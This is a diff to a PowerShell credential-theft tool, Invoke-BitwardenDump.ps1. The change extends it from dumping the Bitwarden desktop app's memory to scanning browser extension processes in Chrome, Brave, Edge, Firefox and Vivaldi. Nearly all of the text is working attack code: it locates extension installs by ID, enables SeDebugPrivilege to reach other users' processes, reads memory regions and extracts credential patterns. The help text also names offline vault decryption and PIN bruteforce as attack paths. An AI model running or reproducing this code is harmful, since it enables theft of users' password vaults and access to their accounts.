@@ -241,15 +241,16 @@ function Show-Help {
     $helpText = @"
 
   MODES:
-    -Recon              Enumerate Bitwarden presence, creds in Credential Manager,
-                        data.json config, and recommend attack path
-    -Dump               Dump Bitwarden process memory and extract credentials
+    -Recon              Enumerate Bitwarden presence (desktop + browser extensions),
+                        Credential Manager, data.json config, recommend attack path
+    -Dump               Dump memory from Bitwarden desktop AND browser extension
+                        processes (Chrome, Brave, Edge, Firefox, Vivaldi)
     -Offline            Full offline vault decryption via Credential Manager + data.json
     -ParseDump <file>   Parse an existing memory dump file
     -All                Run recon, then execute best available attack automatically
 
   OPTIONS:
-    -TargetPid <int>    Target a specific Bitwarden PID (with -Dump)
+    -TargetPid <int>    Target a specific PID (with -Dump, skips auto-discovery)
     -ApiUrl <url>       Bitwarden/Vaultwarden API URL (with -Offline, default: vault.bitwarden.com)
     -SaveDump           Save raw memory dump to disk (with -Dump)
     -OutputFile <file>  Output file for results (default: credentials.json)
@@ -258,6 +259,7 @@ function Show-Help {
 
   EXAMPLES:
     .\Invoke-BitwardenDump.ps1 -Recon
+    .\Invoke-BitwardenDump.ps1 -Dump
     .\Invoke-BitwardenDump.ps1 -Dump -SaveDump
     .\Invoke-BitwardenDump.ps1 -Dump -TargetPid 4812
     .\Invoke-BitwardenDump.ps1 -Offline -ApiUrl https://vaultwarden.corp.local
@@ -270,7 +272,7 @@ function Show-Help {
 
   ATTACK PATHS:
     1. Timeout=Never or old Windows Hello -> -Offline (best: silent, offline, complete)
-    2. Vault unlocked in memory           -> -Dump (requires process access)
+    2. Vault unlocked (desktop or browser)-> -Dump (desktop app + browser extensions)
     3. PIN unlock enabled                 -> -Offline + PIN bruteforce
 "@
     Write-Host $helpText -ForegroundColor Gray
@@ -673,8 +675,19 @@ function Invoke-BWRecon {
     }
     if ($bwProcesses) {
         $main = $bwProcesses | Sort-Object MemoryMB -Descending | Select-Object -First 1
-        Write-Status "MEMORY DUMP POSSIBLE - Bitwarden PID $($main.PID) ($($main.Owner), $($main.MemoryMB)MB)" "warn"
-        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump -TargetPid $($main.PID)" "info"
+        Write-Status "MEMORY DUMP POSSIBLE - Bitwarden desktop PID $($main.PID) ($($main.Owner), $($main.MemoryMB)MB)" "warn"
+        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
+    }
+    $browserNames = @{ "chrome" = "Chrome"; "brave" = "Brave"; "msedge" = "Edge"; "firefox" = "Firefox"; "vivaldi" = "Vivaldi" }
+    foreach ($pname in $browserNames.Keys) {
+        $bp = Get-Process -Name $pname -ErrorAction SilentlyContinue
+        if ($bp -and $script:browserExtPaths) {
+            $matching = $script:browserExtPaths | Where-Object { $_.Browser -eq $browserNames[$pname] }
+            if ($matching) {
+                Write-Status "BROWSER DUMP POSSIBLE - $($browserNames[$pname]) ($($bp.Count) procs, extension installed)" "warn"
+                Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
+            }
+        }
     }
     if (-not $autoKeyCred -and -not $bwProcesses -and -not $script:browserExtPaths) {
         Write-Status "No attack paths identified on this machine" "bad"
@@ -725,32 +738,13 @@ function Scan-LevelDbForKeys {
 #  Dump Mode (Memory)
 # ============================================================================
 
-function Invoke-BWDump {
-    param([int]$TargetPid, [bool]$DoSaveDump, [string]$OutFile)
+function Scan-ProcessMemory {
+    param([System.Diagnostics.Process]$Target, [ref]$Credentials, [bool]$DoSaveDump, [string]$Label)
 
-    Write-Status "MEMORY DUMP" "header"
+    $owner = Get-ProcessOwner -ProcessId $Target.Id
+    $memMB = [math]::Round($Target.WorkingSet64 / 1MB, 1)
+    Write-Status "Target: PID $($Target.Id) | $($Target.ProcessName) | Owner: $owner | Mem: ${memMB}MB | $Label" "info"
 
-    # Find target process
-    $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)bitwarden' }
-    if ($TargetPid -gt 0) {
-        $target = $bwProcs | Where-Object { $_.Id -eq $TargetPid }
-        if (-not $target) {
-            Write-Status "PID $TargetPid not found among Bitwarden processes" "bad"
-            return
-        }
-    } else {
-        if (-not $bwProcs) {
-            Write-Status "No Bitwarden processes found" "bad"
-            return
-        }
-        $target = $bwProcs | Sort-Object WorkingSet64 -Descending | Select-Object -First 1
-    }
-
-    $owner = Get-ProcessOwner -ProcessId $target.Id
-    $memMB = [math]::Round($target.WorkingSet64 / 1MB, 1)
-    Write-Status "Target: PID $($target.Id) | $($target.ProcessName) | Owner: $owner | Mem: ${memMB}MB" "info"
-
-    # Check if we need SeDebugPrivilege
     $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
     if ($owner -ne "UNKNOWN" -and $owner -ne $currentUser) {
         Write-Status "Cross-user dump: enabling SeDebugPrivilege..." "warn"
@@ -762,58 +756,140 @@ function Invoke-BWDump {
         }
     }
 
-    # Open process
-    $hProc = [BW.Mem]::Open($target.Id)
+    $hProc = [BW.Mem]::Open($Target.Id)
     if ($hProc -eq [IntPtr]::Zero) {
-        Write-Status "Failed to open process (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))" "bad"
+        Write-Status "Failed to open PID $($Target.Id) (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))" "warn"
         return
     }
-    Write-Status "Process opened successfully" "good"
 
-    # Enumerate memory regions
     $regions = [BW.Mem]::GetRegions($hProc)
-    Write-Status "Found $($regions.Count) readable memory regions" "info"
-    $totalSize = ($regions | ForEach-Object { $_[1] } | Measure-Object -Sum).Sum
-    Write-Status "Total readable memory: $([math]::Round($totalSize / 1MB, 1))MB" "info"
+    Write-Status "  Regions: $($regions.Count) | Readable: $([math]::Round(($regions | ForEach-Object { $_[1] } | Measure-Object -Sum).Sum / 1MB, 1))MB" "info"
 
-    # Read and scan memory
-    $allStrings = @()
-    $credentials = @()
     $dumpStream = $null
     if ($DoSaveDump) {
-        $dumpPath = "bitwarden_$($target.Id).dmp"
+        $dumpPath = "$($Target.ProcessName)_$($Target.Id).dmp"
         $dumpStream = [System.IO.File]::Create($dumpPath)
-        Write-Status "Saving dump to: $dumpPath" "info"
     }
 
-    $regionCount = 0
+    $before = $Credentials.Value.Count
     foreach ($region in $regions) {
-        $regionCount++
-        if ($regionCount % 100 -eq 0) {
-            Write-Verbose "Scanning region $regionCount / $($regions.Count)..."
-        }
         $baseAddr = $region[0]
-        $size = [int][Math]::Min($region[1], 10 * 1024 * 1024) # Cap at 10MB per region
+        $size = [int][Math]::Min($region[1], 10 * 1024 * 1024)
         $data = [BW.Mem]::ReadRegion($hProc, $baseAddr, $size)
         if (-not $data -or $data.Length -eq 0) { continue }
-
         if ($dumpStream) { $dumpStream.Write($data, 0, $data.Length) }
-
-        # Extract UTF-8 strings
         $str = [System.Text.Encoding]::UTF8.GetString($data)
-        Find-CredentialPatterns -Text $str -Credentials ([ref]$credentials)
-
-        # Extract UTF-16LE strings for Windows-native data
+        Find-CredentialPatterns -Text $str -Credentials $Credentials
         $str16 = [System.Text.Encoding]::Unicode.GetString($data)
-        Find-CredentialPatterns -Text $str16 -Credentials ([ref]$credentials)
+        Find-CredentialPatterns -Text $str16 -Credentials $Credentials
     }
 
     if ($dumpStream) {
         $dumpStream.Close()
-        Write-Status "Dump saved: $dumpPath ($([math]::Round((Get-Item $dumpPath).Length / 1MB, 1))MB)" "good"
+        Write-Status "  Dump saved: $dumpPath ($([math]::Round((Get-Item $dumpPath).Length / 1MB, 1))MB)" "good"
+    }
+    [BW.Mem]::Close($hProc)
+    $found = $Credentials.Value.Count - $before
+    Write-Status "  Raw matches: $found" $(if ($found -gt 0) { "good" } else { "info" })
+}
+
+function Invoke-BWDump {
+    param([int]$TargetPid, [bool]$DoSaveDump, [string]$OutFile)
+
+    Write-Status "MEMORY DUMP" "header"
+
+    $credentials = @()
+
+    # --- Desktop app processes ---
+    $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
+    if ($TargetPid -gt 0) {
+        $allProcs = Get-Process -ErrorAction SilentlyContinue
+        $target = $allProcs | Where-Object { $_.Id -eq $TargetPid }
+        if (-not $target) {
+            Write-Status "PID $TargetPid not found" "bad"
+            return
+        }
+        Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Manual PID"
+    } else {
+        if ($bwProcs) {
+            $target = $bwProcs | Sort-Object WorkingSet64 -Descending | Select-Object -First 1
+            Write-Status "DESKTOP APP" "header"
+            Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Desktop"
+        } else {
+            Write-Status "No Bitwarden desktop process found" "info"
+        }
+
+        # --- Browser extension processes ---
+        Write-Status "BROWSER EXTENSIONS (Memory)" "header"
+        $browserPatterns = @{
+            "Chrome"  = '^chrome$'
+            "Brave"   = '^brave$'
+            "Edge"    = '^msedge$'
+            "Firefox" = '^firefox$'
+            "Vivaldi" = '^vivaldi$'
+        }
+        $extIds = @{
+            "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
+            "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
+            "Brave"   = "nngceckbapebfimnlniiiahkandclblb"
+            "Vivaldi" = "nngceckbapebfimnlniiiahkandclblb"
+        }
+        $browsersFound = $false
+        foreach ($browser in $browserPatterns.Keys) {
+            $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match $browserPatterns[$browser] }
+            if (-not $procs) { continue }
+
+            # Check if Bitwarden extension is installed for this browser
+            $hasExt = $false
+            if ($extIds.ContainsKey($browser)) {
+                $userData = switch ($browser) {
+                    "Chrome"  { "$env:LOCALAPPDATA\Google\Chrome\User Data" }
+                    "Edge"    { "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
+                    "Brave"   { "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
+                    "Vivaldi" { "$env:LOCALAPPDATA\Vivaldi\User Data" }
+                    default   { "" }
+                }
+                if ($userData -and (Test-Path $userData)) {
+                    $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
+                    foreach ($prof in $profiles) {
+                        if (Test-Path (Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])")) {
+                            $hasExt = $true; break
+                        }
+                    }
+                }
+            }
+            if ($browser -eq "Firefox") {
+                $fxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
+                foreach ($fp in $fxProfiles) {
+                    if (Get-ChildItem (Join-Path $fp.FullName "storage\default\moz-extension*") -Directory -ErrorAction SilentlyContinue) {
+                        $hasExt = $true; break
+                    }
+                }
+            }
+
+            if (-not $hasExt) {
+                Write-Verbose "$browser running but no Bitwarden extension found, skipping"
+                continue
+            }
+
+            $browsersFound = $true
+            # Chromium: scan the top 3 largest renderer processes (vault data lives in renderer heap)
+            # Firefox: scan the top 3 largest content processes
+            $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
+            Write-Status "$browser ($($procs.Count) procs, scanning top $($targets.Count) by memory)" "info"
+            foreach ($t in $targets) {
+                Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext"
+            }
+        }
+        if (-not $browsersFound) {
+            Write-Status "No browsers with Bitwarden extension detected" "info"
+        }
     }
 
-    [BW.Mem]::Close($hProc)
+    if ($credentials.Count -eq 0 -and -not $bwProcs -and -not $TargetPid) {
+        Write-Status "No Bitwarden processes (desktop or browser) found" "bad"
+        return
+    }
 
     # Filter out EncStrings, garbage, and deduplicate
     $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
@@ -1417,14 +1493,15 @@ function Invoke-BitwardenDump {
         if ($autoKeyCred -or $hasLevelDbKey) {
             Write-Status "Auto-selecting: OFFLINE DECRYPT" "warn"
             Invoke-BWOffline -ApiBaseUrl $ApiUrl -OutFile $OutputFile
-        } else {
-            $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)bitwarden' }
-            if ($bwProcs) {
-                Write-Status "Auto-selecting: MEMORY DUMP" "warn"
-                Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
-            } else {
-                Write-Status "No viable attack path found" "bad"
-            }
+        }
+        # Always try memory dump (desktop + browser) in -All mode
+        $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
+        $browserProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^(chrome|brave|msedge|firefox|vivaldi)$' }
+        if ($bwProcs -or $browserProcs) {
+            Write-Status "Auto-selecting: MEMORY DUMP (desktop + browser)" "warn"
+            Invoke-BWDump -TargetPid $TargetPid -DoSaveDump $SaveDump.IsPresent -OutFile $OutputFile
+        } elseif (-not $autoKeyCred -and -not $hasLevelDbKey) {
+            Write-Status "No viable attack path found" "bad"
         }
     }
 
